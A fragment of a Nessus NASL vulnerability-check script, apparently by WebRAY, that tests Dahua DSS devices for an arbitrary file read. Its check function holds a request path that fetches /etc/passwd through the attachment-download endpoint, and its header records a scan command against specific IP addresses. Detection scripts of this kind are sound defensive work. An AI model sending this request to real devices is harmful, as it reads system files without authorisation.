...
# Copyright @WebRAY  /opt/nessus/bin/nasl -k time172.18.253.11.kb -Xt 59.57.18.10 dahua_2-nessus.nasl
############################################################
include("compat.inc");
...
if (description)
{
  script_id(51799132);
  script_version("1.3");
  script_name(english:"dahua DSS device Arbitrary file read");
  script_summary(english:"dahua DSS device Arbitrary file read");
  script_set_attribute(attribute:"description", value:"dahua DSS device Arbitrary file read");
...
function check_vuln(port){
	url = string('/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd');
